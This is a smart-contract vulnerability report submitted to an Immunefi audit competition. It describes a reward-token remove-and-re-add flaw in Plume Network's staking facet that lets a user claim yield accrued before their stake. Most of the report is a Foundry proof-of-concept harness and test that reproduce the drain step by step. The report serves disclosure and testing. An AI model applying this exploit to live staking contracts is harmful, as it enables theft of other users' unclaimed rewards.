# 49731 sc high theft on re added tokens

**Submitted on Jul 18th 2025 at 19:31:13 UTC by @oswald23321 for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #49731
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/StakingFacet.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief/Intro

When a reward token is removed and later re-added, `_initializeRewardStateForNewStake` (plume/src/facets/StakingFacet.sol) only initializes per-user tracking for the tokens that are currently active. If user stake and then remove, their `userValidatorRewardPerTokenPaidTimestamp` for that token is never set.

### Vulnerability Details

After the token is re-added and rewards accrue (funded by other stakers), the same user can:

* Wait until the token is removed again (or simply remain inactive).
* Stake a large amount after removal.
* Call claim and receive rewards calculated from the old timestamp (often 0), as if their new stake had existed during the entire accrual window.

### Impact Details

The attacker can drain the reward pool for the affected token.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

import {PlumeStakingStorage} from "../src/lib/PlumeStakingStorage.sol";
import {PlumeRewardLogic} from "../src/lib/PlumeRewardLogic.sol";

contract PlumeHarness {
    using PlumeStakingStorage for PlumeStakingStorage.Layout;
    uint16 internal constant VID = 1;

    function initValidatorAndToken(address token, uint256 rate) external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        if (!$.validatorExists[VID]) {
            $.validatorExists[VID] = true;
            $.validators[VID].validatorId = VID;
            $.validators[VID].active = true;
            $.validatorIds.push(VID);
        }

        if (!$.isHistoricalRewardToken[token]) {
            $.isHistoricalRewardToken[token] = true;
            $.historicalRewardTokens.push(token);
        }

        $.tokenRemovalTimestamps[token] = 0;
        $.tokenAdditionTimestamps[token] = block.timestamp;

        $.rewardTokens.push(token);
        $.isRewardToken[token] = true;
        $.rewardRates[token] = rate;
        $.maxRewardRates[token] = rate;

        PlumeRewardLogic.createRewardRateCheckpoint($, token, VID, rate);
    }

    function removeToken(address token) external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        require($.isRewardToken[token], "token not active");

        $.tokenRemovalTimestamps[token] = block.timestamp;
        $.isRewardToken[token] = false;

        uint256 len = $.rewardTokens.length;
        for (uint256 i = 0; i < len; i++) {
            if ($.rewardTokens[i] == token) {
                $.rewardTokens[i] = $.rewardTokens[len - 1];
                $.rewardTokens.pop();
                break;
            }
        }

        PlumeRewardLogic.createRewardRateCheckpoint($, token, VID, 0);
    }

    function reAddToken(address token, uint256 rate) external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        require(!$.isRewardToken[token], "already active");

        if (!$.isHistoricalRewardToken[token]) {
            $.isHistoricalRewardToken[token] = true;
            $.historicalRewardTokens.push(token);
        }

        $.tokenRemovalTimestamps[token] = 0;
        $.tokenAdditionTimestamps[token] = block.timestamp;
        $.isRewardToken[token] = true;
        $.rewardTokens.push(token);
        $.rewardRates[token] = rate;
        $.maxRewardRates[token] = rate;

        PlumeRewardLogic.createRewardRateCheckpoint($, token, VID, rate);
    }

    function stake(uint256 amount) external payable {
        require(msg.value == amount, "value != amount");
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        address user = msg.sender;

        bool isNewStake = $.userValidatorStakes[user][VID].staked == 0;

        if (isNewStake) {
            _initializeRewardState(user);
        } else {
            PlumeRewardLogic.updateRewardsForValidator($, user, VID);
        }

        $.userValidatorStakes[user][VID].staked += amount;
        $.validatorTotalStaked[VID] += amount;
    }

    function unstake() external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        address user = msg.sender;
        uint256 amt = $.userValidatorStakes[user][VID].staked;
        require(amt > 0, "nothing to unstake");

        PlumeRewardLogic.updateRewardsForValidator($, user, VID);
        $.userValidatorStakes[user][VID].staked = 0;
        $.validatorTotalStaked[VID] -= amt;

    }

    function claimable(address user, address token) external returns (uint256) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        uint256 staked = $.userValidatorStakes[user][VID].staked;
        (uint256 delta,,) = PlumeRewardLogic.calculateRewardsWithCheckpoints($, user, VID, token, staked);
        return $.userRewards[user][VID][token] + delta;
    }

    function _initializeRewardState(address user) internal {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.userValidatorStakeStartTime[user][VID] = block.timestamp;

        address[] storage tokenList = $.rewardTokens;
        for (uint256 i = 0; i < tokenList.length; i++) {
            address token = tokenList[i];
            if ($.isRewardToken[token]) {
                PlumeRewardLogic.updateRewardPerTokenForValidator($, token, VID);

                $.userValidatorRewardPerTokenPaid[user][VID][token] =
                    $.validatorRewardPerTokenCumulative[VID][token];
                $.userValidatorRewardPerTokenPaidTimestamp[user][VID][token] = block.timestamp;
            }
        }
    }

    receive() external payable {}
}
contract VulnerabilityTest is Test {
    PlumeHarness internal harness;
    address internal token = address(0xBEEF);
    address internal userA = address(0xA);
    address internal userB = address(0xB);

    function setUp() public {
        vm.label(token, "RewardToken");
        vm.label(userA, "UserA");
        vm.label(userB, "UserB");

        harness = new PlumeHarness();

        vm.warp(0);
        harness.initValidatorAndToken(token, 1 ether);

        vm.deal(userA, 200 ether);
        vm.deal(userB, 100 ether);
    }

    function test_VulnerabilityFlow() public {
        vm.warp(100);
        harness.removeToken(token);

        vm.startPrank(userA);
        harness.stake{ value: 10 ether }(10 ether);
        harness.unstake();
        vm.stopPrank();

        vm.warp(110);
        harness.reAddToken(token, 1 ether);

        // vm.warp(600);

        vm.warp(120);
        vm.startPrank(userB);
        harness.stake{value: 50 ether}(50 ether);
        vm.stopPrank();

        vm.warp(600);
        harness.removeToken(token);

        vm.warp(601);
        vm.startPrank(userA);
        harness.stake{ value: 100 ether }(100 ether);
        vm.stopPrank();

        uint256 reward = harness.claimable(userA, token);
        assertGt(reward, 0, "Bug not reproduced: reward is zero but should be > 0");
    }
} 
```
